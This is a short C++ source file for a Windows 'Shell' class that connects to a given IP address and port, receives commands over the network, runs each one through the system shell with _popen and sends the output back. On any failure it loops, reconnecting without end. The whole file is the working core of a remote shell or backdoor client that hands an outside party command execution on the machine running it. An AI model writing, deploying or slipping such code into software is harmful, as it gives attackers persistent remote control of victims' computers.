#include "Shell.h"

Shell::Shell(char* ip, short port) {
    _communication = new Communication(ip, port);
}

string Shell::execCommand(string command) {
    char buffer[128];
    string result = "", tmp = "";
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "popen failed!";
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        tmp = buffer;
        result += tmp;
    }
    _pclose(pipe);

    return result;
}

void Shell::run() {
    while (true) {
        try {
            _communication->sendMsg(execCommand(_communication->getMsg()));
        }
        catch (...) {
            while (!_communication->connect()) {}
        }
    }
}